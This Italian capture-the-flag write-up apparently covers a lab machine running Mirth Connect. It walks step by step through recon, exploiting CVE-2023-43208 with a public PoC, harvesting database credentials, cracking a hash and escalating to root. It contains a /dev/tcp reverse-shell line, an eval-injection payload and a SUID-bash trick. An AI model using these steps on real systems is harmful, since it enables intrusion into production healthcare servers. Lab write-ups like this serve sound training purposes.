IP vittima: 10.129.244.184
IP attaccante: 10.10.15.219
## Recon
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.244.184 -oG porte`
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 11:18 CEST
Initiating SYN Stealth Scan at 11:18
Scanning 10.129.244.184 [65535 ports]
Discovered open port 443/tcp on 10.129.244.184
Discovered open port 22/tcp on 10.129.244.184
Discovered open port 80/tcp on 10.129.244.184
Discovered open port 6661/tcp on 10.129.244.184
Completed SYN Stealth Scan at 11:18, 11.65s elapsed (65535 total ports)
Nmap scan report for 10.129.244.184
Host is up, received user-set (0.026s latency).
Scanned at 2026-05-16 11:18:12 CEST for 12s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
443/tcp  open  https   syn-ack ttl 63
6661/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
           Raw packets sent: 65916 (2.900MB) | Rcvd: 65552 (2.622MB)
```
**Risultato:** 4 porte aperte — 22 (SSH), 80 (HTTP), 443 (HTTPS), 6661 (unknown).
`sudo nmap -sC -sV -O -p22,80,443,6661 10.129.244.184 -oN servizi`
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 11:19 CEST
Nmap scan report for interpreter.htb (10.129.244.184)
Host is up (0.022s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp   open  http     Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http Jetty
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
6661/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.77 seconds
```

| Porta | Servizio | Versione                            |
| ----- | -------- | ----------------------------------- |
| 22    | SSH      | OpenSSH 9.2p1 Debian                |
| 80    | HTTP     | Jetty — Mirth Connect Administrator |
| 443   | HTTPS    | Jetty — Mirth Connect Administrator |
| 6661  | Unknown  | —                                   |
**Note:** TTL 63 → Linux, 2 hop. Il certificato SSL ha CN `mirth-connect`. Nmap risolve l'IP come `interpreter.htb`

**1. Identificazione del software.** Il titolo HTTP `Mirth Connect Administrator` è inequivocabile. Mirth Connect è un integration engine open source per healthcare (HL7), sviluppato da NextGen Healthcare.

**2. Conoscenza del software.** Mirth Connect espone di default alcuni endpoint noti, documentati pubblicamente nel codice sorgente open source e nella documentazione ufficiale. Tra questi c'è `/webstart.jnlp`, il file Java Web Start che serve all'Administrator Launcher per connettersi al server — e contiene la versione in chiaro nell'attributo `version`.

Scoperto anche navigando su `http://interpreter.htb` la pagina stessa suggerisce di usare il launcher, e il codice HTML della pagina contiene la funzione `launchAdministrator()` che costruisce l'URL `http://hostname:80/webstart.jnlp`

Trovato anche con [[gobuster]]
`gobuster dir -u http://interpreter.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://interpreter.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 302) [Size: 0] [--> http://interpreter.htb/images/]
/css                  (Status: 302) [Size: 0] [--> http://interpreter.htb/css/]
/js                   (Status: 302) [Size: 0] [--> http://interpreter.htb/js/]
/webadmin             (Status: 302) [Size: 0] [--> http://interpreter.htb/webadmin/]
/installers           (Status: 302) [Size: 0] [--> http://interpreter.htb/installers/]
/webstart             (Status: 200) [Size: 17920]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Riconosciuto Mirth Connect dall'HTTP title, interroghiamo l'endpoint `/webstart.jnlp` (possiamo anche scaricare il file) — noto anche dalla documentazione pubblica — che ha rivelato la versione **4.4.0** di Mirth Connect.
```
cat webstart.jnlp | grep "version"
... snip
<jnlp codebase="https://interpreter.htb:443" version="4.4.0">
... snip
```
## Foothold: CVE-2023-43208
Mirth Connect 4.4.0 è vulnerabile a **CVE-2023-43208**, un RCE pre-autenticato che sfrutta una deserializzazione Java non sicura. Colpisce tutte le versioni precedenti alla 4.4.1.

Esistono PoC pubblici su GitHub. Cerchiamo e usiamo quello disponibile:
https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT
Dopo aver scaricato l'exploit, installato le dipendenze in un ambiente **venv**, lanciamo l'exploit:
```
python3 CVE-2023-43208.py -u https://10.129.244.184 -lh 10.10.15.219 -lp 4444
```
Otteniamo una shell con l'uente **mirth**:
``` bash
 ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██   ██ ██████  ██████   ██████   █████
██      ██    ██ ██                 ██ ██  ████      ██      ██       ██   ██      ██      ██ ██  ████ ██   ██
██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████ ███████  █████   █████  ██ ██ ██  █████
██       ██  ██  ██            ██      ████  ██ ██           ██            ██      ██ ██      ████  ██ ██   ██
 ██████   ████   ███████       ███████  ██████  ███████ ██████             ██ ██████  ███████  ██████   █████

[+] Coded By: K3ysTr0K3R and Chocapikk ( NSA, we're still waiting :D )

[*] Setting up listener on 10.10.15.219:4444 and launching exploit...
[*] Waiting for incoming connection on port 4444...
[*] Looking for Mirth Connect instance...
[+] Found Mirth Connect instance
[+] Vulnerable Mirth Connect version 4.4.0 instance found at https://10.129.244.184
[!] sh -c $@|sh . echo bash -c '0<&53-;exec 53<>/dev/tcp/10.10.15.219/4444;sh <&53 >&53 2>&53'
[*] Launching exploit against https://10.129.244.184...
[+] Received connection from 10.129.244.184:52800
[+] Interactive shell established. Type 'exit' to quit.
whoami
mirth
id
uid=103(mirth) gid=111(mirth) groups=111(mirth)
pwd
/usr/local/mirthconnect
```
Miglioriamo la shell con 
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
## Local Enumeration
nella cartella `/home` troviamo la cartella dell'utente reale **sedric** a cui non è possibile accedere
Utente presente anche in `/etc/passwd` con possibilità di shell bash:
```
...
sedric:x:1000:1000:sedric,,,:/home/sedric:/bin/bash
mirth:x:103:111::/nonexistent:/usr/sbin/nologin
...
```

Proviamo a cercare delle credenziali.
Mirth Connect è open source su GitHub. Chiunque può leggere la struttura del progetto e sapere che il file di configurazione principale si trova in `conf/mirth.properties` dentro la directory di installazione. È documentato ufficialmente.
Quando otteniamo la shell siamo già in `/usr/local/mirthconnect`. Un semplice `ls` mostra la presenza della cartella `conf` che contiene il file `mirth.properties`
Analizziamo il file con:
`cat /usr/local/mirthconnect/conf/mirth.properties | grep -i "pass\|user\|db"`
Troviamo:
```
#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
database.driver = org.mariadb.jdbc.Driver
database.username = mirthdb
database.password = MirthPass123!
```
Abbiamo quindi un database **mc_bdd_prod** sulla porta locale **3306** accessibile con user **mirthdb** e password **MirthPass123!**
## Database mc_bdd_prod
Accediamo al database:
`mysql -u mirthdb -p'MirthPass123!' -h localhost mc_bdd_prod`
Una volta dentro, vediamo i database disponibili:
```sql
SHOW DATABASES;
```
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mc_bdd_prod        |
+--------------------+
```
Selezioniamo il database di Mirth Connect e mostriamo le tabelle:
```sql
USE mc_bdd_prod;
SHOW TABLES;
```
Tra le tabelle notiamo `PERSON` e `PERSON_PASSWORD` — le più interessanti. Le esploriamo:
```sql
SELECT * FROM PERSON;
```
Troviamo l'utente `sedric`. Poi cerchiamo la sua password:
```sql
SELECT * FROM PERSON_PASSWORD;
```
Otteniamo l'hash: `u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==`
## Crack della password
L'hash trovato nel DB è in formato Base64. Ci sono alcuni indizi visivi che permettono di riconoscere una stringa Base64 a colpo d'occhio:
**1. Caratteri usati.** Base64 usa solo questi caratteri: lettere maiuscole e minuscole (`A-Z`, `a-z`), cifre (`0-9`), e i simboli `+` e `/`. La nostra stringa contiene esattamente questi caratteri.
**2. Il padding finale.** Base64 termina spesso con uno o due `=` come padding per allineare la lunghezza. La nostra stringa termina con `==`.
**3. La lunghezza.** Le stringhe Base64 hanno sempre una lunghezza multipla di 4. La nostra stringa ha 56 caratteri (56 / 4 = 14 ✓).
**4. L'assenza di caratteri speciali.** Non ci sono spazi, trattini, dollari o altri simboli tipici di formati come bcrypt (`$2b$...`) o MD5 (stringa hex pura).

Il primo passo è decodificarlo e contare i byte raw:
```bash
echo "u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==" | base64 -d | wc -c
# 40 byte
```
40 byte non corrisponde a nessun algoritmo standard comune:
- SHA-1 → 20 byte
- SHA-256 → 32 byte
- SHA-512 → 64 byte

Dobbiamo cercare come Mirth Connect gestisce le password. Essendo open source, la risposta è nella documentazione: dalla versione 4.4.0 in poi Mirth Connect usa **PBKDF2WithHmacSHA256** con 600.000 iterazioni, dove i primi **8 byte sono il salt** e i restanti **32 byte sono l'hash derivato** (8 + 32 = 40 ✓).

![[Pasted image 20260516142816.png]]

Verifichiamo estraendo salt e hash e costruiamo la stringa per hashcat con questo one-liner python:
``` python
python3 -c "
import base64
raw = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
print(f'Byte totali : {len(raw)}')
print(f'Salt (8B)   : {raw[:8].hex()}')
print(f'Hash (32B)  : {raw[8:].hex()}')
salt_b64 = base64.b64encode(raw[:8]).decode()
hash_b64 = base64.b64encode(raw[8:]).decode()
print(f'sha256:600000:{salt_b64}:{hash_b64}')
"
```
otteniamo:
```
Byte totali : 40
Salt (8B)   : bbff8b0413949da7
Hash (32B)  : 62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```
Cerchiamo di craccare la password con [[hashcat]]
```
echo "sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Se4rXa1VgP5CzLd8Ps=" > hash.txt 
hashcat -m 10900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
troveremo la password **snowflake1**
```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Se4rXa1VgP5CzLd8Ps=:snowflake1
```
## User flag
Ora possiamo diventare lo user **sedric** con la password **snowflake1** e prendere la user flag nella directory `/home/sedric`
```
pwd
/home/sedric
sedric@interpreter:~$ ls -l
ls -l
total 4
-rw-r----- 1 root sedric 33 May 16 05:15 user.txt
```
## Privilege escalation
Scarichiamo [[linpeas]]sulla macchina vittima:
``` bash
# sulla nostra macchina
python -m http.server 8080
# lanciamo un server python nella cartella che contiene linpeas.sh

# sulla macchina vittima
wget http://10.10.15.219:8080/linpeas.sh
```
lanciamo **linpeas**
`/bin/bash linpeas.sh`
LinPEAS trova nella sezione **"Readable files belonging to root and readable by me but not world readable"**:

```
-rwxr----- 1 root sedric 2332   Sep 19  2025 /usr/local/bin/notif.py
```

`notif.py` è di proprietà di `root` ma leggibile da `sedric` (permesso `r-x` per il gruppo sedric). LinPEAS lo evidenzia proprio perché è un file eseguibile di root accessibile a un utente non privilegiato — un pattern tipico da investigare.

Troviamo `notif.py` anche cercando i processi in esecuzione come root con 
`ps auxf | grep "root"`
```
root        3498  0.0  0.7  39872 31012 ?        Ss   05:14   0:02 /usr/bin/python3 /usr/local/bin/notif.py
```

Esaminiamo `notif.py` (`cat /usr/local/bin/notif.py`):
```
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True
```

Si tratta di un **microservizio Flask** — un piccolo server HTTP Python — che gira in locale come root perché deve scrivere in una directory protetta.
**Cosa fa il server:**

- Flask in ascolto su `127.0.0.1:54321`, accetta solo richieste da localhost (possiamo appurarlo con `ss -tlnp`)
- Riceve dati XML con informazioni paziente, li formatta e li scrive in `/var/secure-health/patients/`
- Accetta un solo endpoint: `POST /addPatient`

**Validazione input:** La funzione `template()` applica un regex su tutti i campi:
```python
pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
```
Il regex permette i caratteri `{`, `}`, `/`, `.`, `(`, `)` — sufficienti per costruire espressioni Python.
### **La vulnerabilità — SSTI via eval:**
```python
template = f"Patient {first} {last} ..."
return eval(f"f'''{template}'''")
```
Il codice costruisce una f-string inserendo i campi utente direttamente, poi la valuta con `eval()`. Questo significa che qualsiasi espressione Python valida inserita in un campo viene **eseguita nel contesto del processo root**.

Il campo `birth_date` ha una validazione aggiuntiva sull'anno, mentre `firstname` passa solo il regex — e il regex permette l'inserimento di un payload
## Escalation a shell root
Poiché il payload non può contenere spazi (bloccati dal regex), creiamo prima uno script sulla macchina target:
```bash
echo '#!/bin/bash' > /tmp/pwn.sh
echo 'chmod u+s /bin/bash' >> /tmp/pwn.sh
chmod +x /tmp/pwn.sh
```
Poi lo eseguiamo tramite la vulnerabilità SSTI di `notif.py`:
```bash
python3 -c "import urllib.request; payload = b'<patient><firstname>{__import__(\"os\").system(\"/tmp/pwn.sh\")}</firstname><lastname>test</lastname><sender_app>test</sender_app><timestamp>test</timestamp><birth_date>01/01/2000</birth_date><gender>M</gender></patient>'; req = urllib.request.Request('http://localhost:54321/addPatient', data=payload, headers={'Content-Type':'application/xml'}); print(urllib.request.urlopen(req).read().decode())"
```
oppurecon un comando [[wget]]
```
wget -q -O- --post-data='<patient><firstname>{__import__("os").system("/tmp/pwn.sh")}</firstname><lastname>test</lastname><sender_app>test</sender_app><timestamp>test</timestamp><birth_date>01/01/2000</birth_date><gender>M</gender></patient>' --header='Content-Type: application/xml' http://localhost:54321/addPatient
```
Questo esegue `chmod u+s /bin/bash` come root, rendendo bash SUID. Otteniamo la shell root con:
```bash
/bin/bash -p
whoami
# root
cat /root/root.txt
```

🎉 **Shell root stabile e Root flag ottenuta!**
